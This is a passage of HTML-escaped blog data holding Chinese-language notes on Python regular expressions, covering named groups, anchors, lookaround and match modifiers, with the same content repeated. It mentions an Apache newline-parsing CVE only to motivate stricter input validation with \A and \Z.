class=\"string\">'day'</span>)</span><br><span class=\"line\"><span class=\"keyword\">print</span> r.group(<span class=\"number\">1</span>)</span><br><span class=\"line\"><span class=\"keyword\">print</span> r.group(<span class=\"number\">2</span>)</span><br><span class=\"line\"><span class=\"keyword\">print</span> r.group(<span class=\"number\">3</span>)</span><br></pre></td></tr></table></figure>\n\n<p>从上看出仍然可以用数字编号来引用分组。</p>\n<p><img src=\"/img/python/Reg/001.png\" alt=\"001\"></p>\n<p>值得注意的是，需要反向引用时必须用<code>（？P=name）</code>,在正则表达式中进行替换需要写做<code>\\g&lt;name&gt;</code></p>\n<p><img src=\"/img/python/Reg/002.png\" alt=\"002\"></p>\n<h3 id=\"非捕获分组\"><a href=\"#非捕获分组\" class=\"headerlink\" title=\"非捕获分组\"></a>非捕获分组</h3><p>非捕获分组不会保存匹配文本，能提高正则提高效率。</p>\n<p>用法：<code>（？：...）</code></p>\n<p>示例：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">print</span> re.search(<span class=\"string\">r'(\\d&#123;4&#125;)-(\\d&#123;2&#125;)-(\\d&#123;2&#125;)'</span>,<span class=\"string\">'2018-12-22'</span>).group(<span class=\"number\">1</span>)</span><br><span class=\"line\"><span class=\"keyword\">print</span> re.search(<span class=\"string\">r'(?:\\d&#123;4&#125;)-(\\d&#123;2&#125;)-(\\d&#123;2&#125;)'</span>,<span class=\"string\">'2018-12-22'</span>).group(<span class=\"number\">1</span>)</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/python/Reg/003.png\" alt=\"003\"></p>\n<h2 id=\"0x01-断言\"><a href=\"#0x01-断言\" class=\"headerlink\" title=\"0x01 断言\"></a>0x01 断言</h2><p>断言用来判断某个位置的文本是否符合要求。</p>\n<p>常见断言: 单词边界、行起始/结束位置、环视</p>\n<h3 id=\"单词边界\"><a href=\"#单词边界\" class=\"headerlink\" title=\"单词边界\"></a>单词边界</h3><p> <code>\\b</code>是为了区分单词还是字符串而使用的</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">字符串</th>\n<th align=\"center\">\\brow\\b</th>\n<th align=\"center\">\\brow</th>\n<th align=\"center\">row\\b</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">tomorrow</td>\n<td align=\"center\"></td>\n<td align=\"center\"></td>\n<td align=\"center\">√</td>\n</tr>\n<tr>\n<td align=\"center\">brown</td>\n<td align=\"center\"></td>\n<td align=\"center\"></td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">row</td>\n<td align=\"center\">√</td>\n<td align=\"center\">√</td>\n<td align=\"center\">√</td>\n</tr>\n<tr>\n<td align=\"center\">rowby</td>\n<td align=\"center\"></td>\n<td align=\"center\">√</td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">表达式说明</td>\n<td align=\"center\">只能是单词</td>\n<td align=\"center\">\\b右侧是单词，左侧不能有字符</td>\n<td align=\"center\">\\b左侧是单词，右侧不能有字符</td>\n</tr>\n</tbody></table>\n<h3 id=\"行起始-结束位置\"><a href=\"#行起始-结束位置\" class=\"headerlink\" title=\"行起始/结束位置\"></a>行起始/结束位置</h3><h4 id=\"行终止符\"><a href=\"#行终止符\" class=\"headerlink\" title=\"行终止符\"></a>行终止符</h4><table>\n<thead>\n<tr>\n<th align=\"center\">平台</th>\n<th align=\"center\">行终止符</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">UNIX/Linux</td>\n<td align=\"center\">\\n</td>\n</tr>\n<tr>\n<td align=\"center\">Windows</td>\n<td align=\"center\">\\r\\n</td>\n</tr>\n</tbody></table>\n<p>利用多行模式匹配多行字符串：在正则前加上<code>(?m)</code></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#提取每行的第一个单词</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\">str = <span class=\"string\">'first line\\nsecond line\\r\\n\\rlast line'</span></span><br><span class=\"line\"><span class=\"keyword\">print</span> re.findall(<span class=\"string\">r'(?m)^\\w+'</span>,str)</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/python/Reg/004.png\" alt=\"004\"></p>\n<p>其中第三行因<code>\\r</code>没有匹配上。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#提取整段文本的第一个单词</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\">str = <span class=\"string\">'first line\\nsecond line\\r\\nlast line'</span></span><br><span class=\"line\"><span class=\"keyword\">print</span> re.findall(<span class=\"string\">r'(?m)\\A\\w+'</span>,str)</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/python/Reg/005.png\" alt=\"005\"></p>\n<h3 id=\"锚点\"><a href=\"#锚点\" class=\"headerlink\" title=\"锚点$\"></a>锚点$</h3><h4 id=\"特性\"><a href=\"#特性\" class=\"headerlink\" title=\"特性\"></a>特性</h4><p><code>$</code>会判断行终止符是否存在，智能匹配行结束位置前的字符串</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#提取整段文本的最后一个单词</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\">str = <span class=\"string\">'Some sample test'</span></span><br><span class=\"line\"><span class=\"keyword\">print</span> re.findall(<span class=\"string\">r'\\w+$'</span>,str)</span><br><span class=\"line\">str = <span class=\"string\">'Some sample test\\n'</span></span><br><span class=\"line\"><span class=\"keyword\">print</span> re.findall(<span class=\"string\">r'\\w+$'</span>,str)</span><br></pre></td></tr></table></figure>\n\n<p>结果是一样的。</p>\n<p><img src=\"/img/python/Reg/006.png\" alt=\"006\"></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#利用多行模式匹配每行最后一个单词</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\">str = <span class=\"string\">'first line1\\nsecond line2\\r\\nlast line3'</span></span><br><span class=\"line\"><span class=\"keyword\">print</span> re.findall(<span class=\"string\">r'(?m)\\w+$'</span>,str)</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/python/Reg/007.png\" alt=\"007\"></p>\n<h4 id=\"利用-A和-Z完成更准确的数据验证\"><a href=\"#利用-A和-Z完成更准确的数据验证\" class=\"headerlink\" title=\"利用\\A和\\Z完成更准确的数据验证\"></a>利用\\A和\\Z完成更准确的数据验证</h4><p>由于<code>$</code>还能匹配行终止符,Apache HTTPD 换行解析漏洞（CVE-2017-15715）就是由于这个原因产生。有时就需要更准确的匹配。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">re.search(<span class=\"string\">r'^\\d&#123;6&#125;$'</span>,<span class=\"string\">'123456'</span>) !=<span class=\"literal\">None</span></span><br><span class=\"line\">re.search(<span class=\"string\">r'^\\d&#123;6&#125;$'</span>,<span class=\"string\">'123456\\n'</span>) !=<span class=\"literal\">None</span></span><br><span class=\"line\"><span class=\"comment\">#python不支持\\z,python的\\Z等价于其他语言的\\z</span></span><br><span class=\"line\">re.search(<span class=\"string\">r'\\A\\d&#123;6&#125;\\Z'</span>,<span class=\"string\">'123456'</span>) !=<span class=\"literal\">None</span></span><br><span class=\"line\">re.search(<span class=\"string\">r'\\A\\d&#123;6&#125;\\Z'</span>,<span class=\"string\">'123456\\n'</span>) !=<span class=\"literal\">None</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/python/Reg/008.png\" alt=\"008\"></p>\n<h3 id=\"替换时不会被替代\"><a href=\"#替换时不会被替代\" class=\"headerlink\" title=\"替换时不会被替代\"></a>替换时不会被替代</h3><p>看下面用例,可以处理文本格式。</p>\n<h4 id=\"替换\"><a href=\"#替换\" class=\"headerlink\" title=\"替换\"></a>替换</h4><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\">str = <span class=\"string\">\"line1\\nline2\\nline3\"</span></span><br><span class=\"line\"><span class=\"keyword\">print</span> str</span><br><span class=\"line\"><span class=\"keyword\">print</span> re.sub(<span class=\"string\">r'(?m)$'</span>,<span class=\"string\">'&lt;/p&gt;'</span>,re.sub(<span class=\"string\">r'(?m)^'</span>,<span class=\"string\">'&lt;p&gt;'</span>,str))</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/python/Reg/009.png\" alt=\"009\"></p>\n<h4 id=\"处理行首尾空白字符\"><a href=\"#处理行首尾空白字符\" class=\"headerlink\" title=\"处理行首尾空白字符\"></a>处理行首尾空白字符</h4><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\">str = <span class=\"string\">\"  begin\\n between\\t\\n\\nend \"</span></span><br><span class=\"line\"><span class=\"keyword\">print</span> str</span><br><span class=\"line\"><span class=\"keyword\">print</span> re.sub(<span class=\"string\">r'(?m)^\\s+'</span>,<span class=\"string\">''</span>,re.sub(<span class=\"string\">r'(?m)\\s+$'</span>,<span class=\"string\">''</span>,str))</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/python/Reg/010.png\" alt=\"010\"></p>\n<h3 id=\"环视\"><a href=\"#环视\" class=\"headerlink\" title=\"环视\"></a>环视</h3><p>这部分概念有些多，但是结合实际例子还是很好理解的。</p>\n<h4 id=\"环视分类\"><a href=\"#环视分类\" class=\"headerlink\" title=\"环视分类\"></a>环视分类</h4><table>\n<thead>\n<tr>\n<th align=\"center\">名字</th>\n<th align=\"center\">记法</th>\n<th align=\"center\">判断方向</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">肯定顺序环视</td>\n<td align=\"center\">（?=…）</td>\n<td align=\"center\">向右</td>\n</tr>\n<tr>\n<td align=\"center\">否定顺序环视</td>\n<td align=\"center\">（?!…）</td>\n<td align=\"center\">向右</td>\n</tr>\n<tr>\n<td align=\"center\">肯定逆序环视</td>\n<td align=\"center\">（?&lt;=…）</td>\n<td align=\"center\">向左</td>\n</tr>\n<tr>\n<td align=\"center\">否定逆序环视</td>\n<td align=\"center\">（?&lt;!…）</td>\n<td align=\"center\">向左</td>\n</tr>\n</tbody></table>\n<p>总结一下：</p>\n<ol>\n<li><p>向右看就叫顺序，向左就叫逆序，这和现代人的阅读方向是一致的。</p>\n</li>\n<li><p>肯定是要匹配的字符串，否定是排除的字符串</p>\n</li>\n<li><p>肯定：<code>=</code>，否定：<code>！</code>，顺序：<code>没有&lt;</code> ，逆序：<code>&lt;</code></p>\n</li>\n</ol>\n<h4 id=\"例1\"><a href=\"#例1\" class=\"headerlink\" title=\"例1\"></a>例1</h4><p>将，添加到右侧字符串是3的倍数处。即12345，变成12,345</p>\n   <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"><span class=\"keyword\">print</span> re.sub(<span class=\"string\">r'(?=\\d&#123;3&#125;)'</span>,<span class=\"string\">','</span>,<span class=\"string\">'12345'</span>)</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/python/Reg/011.png\" alt=\"011\"></p>\n<p>产生这个原因是环视的特性：原地执行。可以把<code>12345</code>看成<code>01020304050</code>，（0表示位置，不是表示数字。）现在我处在第一个0的位置，右边存在3个数字，满足正则，因此将第一处<code>0</code>替换为<code>，</code>，在下一个0位置同理。</p>\n<p>改进</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"><span class=\"comment\">#利用+(?!\\d)匹配到字符串尾</span></span><br><span class=\"line\"><span class=\"keyword\">print</span> re.sub(<span class=\"string\">r'(?=(\\d&#123;3&#125;)+(?!\\d))'</span>,<span class=\"string\">','</span>,<span class=\"string\">'123456789'</span>)</span><br><span class=\"line\"><span class=\"comment\">#改进3的倍数时首部插入，</span></span><br><span class=\"line\">  <span class=\"keyword\">print</span> re.sub(<span class=\"string\">r'(?&lt;=\\d)(?=(\\d&#123;3&#125;)+(?!\\d))'</span>,<span class=\"string\">','</span>,<span class=\"string\">'123456789'</span>)</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/python/Reg/012.png\" alt=\"012\"></p>\n<h4 id=\"例2\"><a href=\"#例2\" class=\"headerlink\" title=\"例2\"></a>例2</h4><p>去除中英文混排</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\">str = <span class=\"string\">'中 英文混排, some English word, 有多余的空 白字符'</span></span><br><span class=\"line\"><span class=\"keyword\">print</span> re.sub(<span class=\"string\">r'(?&lt;![a-zA-Z])\\s+(?![a-zA-Z])'</span>,<span class=\"string\">''</span>,str)</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/python/Reg/013.png\" alt=\"013\"></p>\n<h4 id=\"环视结构不影响引用分组\"><a href=\"#环视结构不影响引用分组\" class=\"headerlink\" title=\"环视结构不影响引用分组\"></a>环视结构不影响引用分组</h4><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"><span class=\"keyword\">print</span> re.search(<span class=\"string\">r'(?!=ab)(cd)'</span>,<span class=\"string\">'abcd'</span>).group(<span class=\"number\">0</span>)</span><br><span class=\"line\"><span class=\"keyword\">print</span> re.search(<span class=\"string\">r'(?!=ab)(cd)'</span>,<span class=\"string\">'abcd'</span>).group(<span class=\"number\">1</span>)</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/python/Reg/014.png\" alt=\"014\"></p>\n<p>环视的用法还很多，这里不能一一列举了。</p>\n<h2 id=\"匹配模式\"><a href=\"#匹配模式\" class=\"headerlink\" title=\"匹配模式\"></a>匹配模式</h2><h3 id=\"模式修饰符\"><a href=\"#模式修饰符\" class=\"headerlink\" title=\"模式修饰符\"></a>模式修饰符</h3><p>python中用<code>（？i）</code>来实现不去区分大小写模式</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\">re.search(<span class=\"string\">r'(?i)the'</span>,<span class=\"string\">'The'</span>) != <span class=\"literal\">None</span></span><br><span class=\"line\">re.search(<span class=\"string\">r'(?i)the'</span>,<span class=\"string\">'the'</span>) != <span class=\"literal\">None</span></span><br><span class=\"line\">re.search(<span class=\"string\">r'(?i)the'</span>,<span class=\"string\">'THE'</span>) != <span class=\"literal\">None</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"预订义常量\"><a href=\"#预订义常量\" class=\"headerlink\" title=\"预订义常量\"></a>预订义常量</h3><p>python：re.I （预定义常量在不同语言中写法不同）</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\">re.search(<span class=\"string\">r'the'</span>,<span class=\"string\">'The'</span>,re.I) != <span class=\"literal\">None</span></span><br><span class=\"line\">re.search(<span class=\"string\">r'the'</span>,<span class=\"string\">'the'</span>,re.I) != <span class=\"literal\">None</span></span><br><span class=\"line\">re.search(<span class=\"string\">r'the'</span>,<span class=\"string\">'THE'</span>,re.I) != <span class=\"literal\">None</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/python/Reg/016.png\" alt=\"016\"></p>\n<h3 id=\"常见匹配模式表格（python）\"><a href=\"#常见匹配模式表格（python）\" class=\"headerlink\" title=\"常见匹配模式表格（python）\"></a>常见匹配模式表格（python）</h3><table>\n<thead>\n<tr>\n<th align=\"center\">模式</th>\n<th align=\"center\">模式修饰符用法</th>\n<th align=\"center\">预定义常量</th>\n<th align=\"center\">备注</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">单行模式</td>\n<td align=\"center\">(?s)</td>\n<td align=\"center\">re.S和re.DOTALL</td>\n<td align=\"center\">s（Single line) ，单行模式解决的是.不能代表换行符的问题</td>\n</tr>\n<tr>\n<td align=\"center\">多行模式</td>\n<td align=\"center\">（?m）</td>\n<td align=\"center\">re.M和re.MULTILINE</td>\n<td align=\"center\">使^和$能匹配每行的行首和行尾</td>\n</tr>\n<tr>\n<td align=\"center\">不分大小写</td>\n<td align=\"center\">（?i）</td>\n<td align=\"center\">re.I</td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">注释模式</td>\n<td align=\"center\">（?x）</td>\n<td align=\"center\">re.X和re.VERBOSE</td>\n<td align=\"center\">comment是注释的内容</td>\n</tr>\n<tr>\n<td align=\"center\">多行模式:</td>\n<td align=\"center\"></td>\n<td align=\"center\"></td>\n<td align=\"center\"></td>\n</tr>\n</tbody></table>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\">mstr = <span class=\"string\">'1 line\\nNot digit\\n2 line'</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> line <span class=\"keyword\">in</span> re.findall(<span class=\"string\">r'(?m)^\\d.*'</span>,mstr):</span><br><span class=\"line\">    <span class=\"keyword\">print</span> line</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/python/Reg/017.png\" alt=\"017\"></p>\n<h3 id=\"作用范围\"><a href=\"#作用范围\" class=\"headerlink\" title=\"作用范围\"></a>作用范围</h3><table>\n<thead>\n<tr>\n<th align=\"center\">正则</th>\n<th align=\"center\">匹配文本</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">t(?i)ht</td>\n<td align=\"center\">tHE the thE tHe</td>\n</tr>\n<tr>\n<td align=\"center\">th(?i)e</td>\n<td align=\"center\">thE the</td>\n</tr>\n<tr>\n<td align=\"center\">t((?i)h)e</td>\n<td align=\"center\">tHe the</td>\n</tr>\n<tr>\n<td align=\"center\">t(?i:h)e</td>\n<td align=\"center\">tHe the</td>\n</tr>\n</tbody></table>\n<p>总结：</p>\n<ol>\n<li>放在开头全局起作用</li>\n<li>放在中间对后部分起作用</li>\n<li>在括号内仅对括号范围起作用</li>\n</ol>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"python-正则笔记\"><a href=\"#python-正则笔记\" class=\"headerlink\" title=\"python-正则笔记\"></a>python-正则笔记</h1><h2 id=\"0x00-命名分组\"><a href=\"#0x00-命名分组\" class=\"headerlink\" title=\"0x00 命名分组\"></a>0x00 命名分组</h2><h3 id=\"命名分组捕获\"><a href=\"#命名分组捕获\" class=\"headerlink\" title=\"命名分组捕获\"></a>命名分组捕获</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\">name = <span class=\"string\">r'(?P&lt;year&gt;\\d&#123;4&#125;)-(?P&lt;month&gt;\\d&#123;2&#125;)-(?P&lt;day&gt;\\d&#123;2&#125;)'</span></span><br><span class=\"line\">r = re.search(name, <span class=\"string\">\"2018-09-12\"</span>)</span><br><span class=\"line\"><span class=\"keyword\">print</span> r.group(<span class=\"string\">'year'</span>)</span><br><span class=\"line\"><span class=\"keyword\">print</span> r.group(<span class=\"string\">'month'</span>)</span><br><span class=\"line\"><span class=\"keyword\">print</span> r.group(<span class=\"string\">'day'</span>)</span><br><span class=\"line\"><span class=\"keyword\">print</span> r.group(<span class=\"number\">1</span>)</span><br><span class=\"line\"><span class=\"keyword\">print</span> r.group(<span class=\"number\">2</span>)</span><br><span class=\"line\"><span class=\"keyword\">print</span> r.group(<span class=\"number\">3</span>)</span><br></pre></td></tr></table></figure>\n\n<p>从上看出仍然可以用数字编号来引用分组。</p>\n<p><img src=\"/img/python/Reg/001.png\" alt=\"001\"></p>\n<p>值得注意的是，需要反向引用时必须用<code>（？P=name）</code>,在正则表达式中进行替换需要写做<code>\\g&lt;name&gt;</code></p>\n<p><img src=\"/img/python/Reg/002.png\" alt=\"002\"></p>\n<h3 id=\"非捕获分组\"><a href=\"#非捕获分组\" class=\"headerlink\" title=\"非捕获分组\"></a>非捕获分组</h3><p>非捕获分组不会保存匹配文本，能提高正则提高效率。</p>\n<p>用法：<code>（？：...）</code></p>\n<p>示例：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">print</span> re.search(<span class=\"string\">r'(\\d&#123;4&#125;)-(\\d&#123;2&#125;)-(\\d&#123;2&#125;)'</span>,<span class=\"string\">'2018-12-22'</span>).group(<span class=\"number\">1</span>)</span><br><span class=\"line\"><span class=\"keyword\">print</span> re.search(<span class=\"string\">r'(?:\\d&#123;4&#125;)-(\\d&#123;2&#125;)-(\\d&#123;2&#125;)'</span>,<span class=\"string\">'2018-12-22'</span>).group(<span class=\"number\">1</span>)</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/python/Reg/003.png\" alt=\"003\"></p>\n<h2 id=\"0x01-断言\"><a href=\"#0x01-断言\" class=\"headerlink\" title=\"0x01 断言\"></a>0x01 断言</h2><p>断言用来判断某个位置的文本是否符合要求。</p>\n<p>常见断言: 单词边界、行起始/结束位置、环视</p>\n<h3 id=\"单词边界\"><a href=\"#单词边界\" class=\"headerlink\" title=\"单词边界\"></a>单词边界</h3><p> <code>\\b</code>是为了区分单词还是字符串而使用的</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">字符串</th>\n<th align=\"center\">\\brow\\b</th>\n<th align=\"center\">\\brow</th>\n<th align=\"center\">row\\b</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">tomorrow</td>\n<td align=\"center\"></td>\n<td align=\"center\"></td>\n<td align=\"center\">√</td>\n</tr>\n<tr>\n<td align=\"center\">brown</td>\n<td align=\"center\"></td>\n<td align=\"center\"></td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">row</td>\n<td align=\"center\">√</td>\n<td align=\"center\">√</td>\n<td align=\"center\">√</td>\n</tr>\n<tr>\n<td align=\"center\">rowby</td>\n<td align=\"center\"></td>\n<td align=\"center\">√</td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">表达式说明</td>\n<td align=\"center\">只能是单词</td>\n<td align=\"center\">\\b右侧是单词，左侧不能有字符</td>\n<td align=\"center\">\\b左侧是单词，右侧不能有字符</td>\n</tr>\n</tbody></table>\n<h3 id=\"行起始-结束位置\"><a href=\"#行起始-结束位置\" class=\"headerlink\" title=\"行起始/结束位置\"></a>行起始/结束位置</h3><h4 id=\"行终止符\"><a href=\"#行终止符\" class=\"headerlink\" title=\"行终止符\"></a>行终止符</h4><table>\n<thead>\n<tr>\n<th align=\"center\">平台</th>\n<th align=\"center\">行终止符</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">UNIX/Linux</td>\n<td align=\"center\">\\n</td>\n</tr>\n<tr>\n<td align=\"center\">Windows</td>\n<td align=\"center\">\\r\\n</td>\n</tr>\n</tbody></table>\n<p>利用多行模式匹配多行字符串：在正则前加上<code>(?m)</code></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#提取每行的第一个单词</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\">str = <span class=\"string\">'first line\\nsecond line\\r\\n\\rlast line'</span></span><br><span class=\"line\"><span class=\"keyword\">print</span> re.findall(<span class=\"string\">r'(?m)^\\w+'</span>,str)</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/python/Reg/004.png\" alt=\"004\"></p>\n<p>其中第三行因<code>\\r</code>没有匹配上。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#提取整段文本的第一个单词</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\">str = <span class=\"string\">'first line\\nsecond line\\r\\nlast line'</span></span><br><span class=\"line\"><span class=\"keyword\">print</span> re.findall(<span class=\"string\">r'(?m)\\A\\w+'</span>,str)</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/python/Reg/005.png\" alt=\"005\"></p>\n<h3 id=\"锚点\"><a href=\"#锚点\" class=\"headerlink\" title=\"锚点$\"></a>锚点$</h3><h4 id=\"特性\"><a href=\"#特性\" class=\"headerlink\" title=\"特性\"></a>特性</h4><p><code>$</code>会判断行终止符是否存在，智能匹配行结束位置前的字符串</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#提取整段文本的最后一个单词</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\">str = <span class=\"string\">'Some sample test'</span></span><br><span class=\"line\"><span class=\"keyword\">print</span> re.findall(<span class=\"string\">r'\\w+$'</span>,str)</span><br><span class=\"line\">str = <span class=\"string\">'Some sample test\\n'</span></span><br><span class=\"line\"><span class=\"keyword\">print</span> re.findall(<span class=\"string\">r'\\w+$'</span>,str)</span><br></pre></td></tr></table></figure>\n\n<p>结果是一样的。</p>\n<p><img src=\"/img/python/Reg/006.png\" alt=\"006\"></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#利用多行模式匹配每行最后一个单词</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\">str = <span class=\"string\">'first line1\\nsecond line2\\r\\nlast line3'</span></span><br><span class=\"line\"><span class=\"keyword\">print</span> re.findall(<span class=\"string\">r'(?m)\\w+$'</span>,str)</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/python/Reg/007.png\" alt=\"007\"></p>\n<h4 id=\"利用-A和-Z完成更准确的数据验证\"><a href=\"#利用-A和-Z完成更准确的数据验证\" class=\"headerlink\" title=\"利用\\A和\\Z完成更准确的数据验证\"></a>利用\\A和\\Z完成更准确的数据验证</h4><p>由于<code>$</code>还能匹配行终止符,Apache HTTPD 换行解析漏洞（CVE-2017-15715）就是由于这个原因产生。有时就需要更准确的匹配。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">re.search(<span class=\"string\">r'^\\d&#123;6&#125;$'</span>,<span class=\"string\">'123456'</span>) !=<span class=\"literal\">None</span></span><br><span class=\"line\">re.search(<span 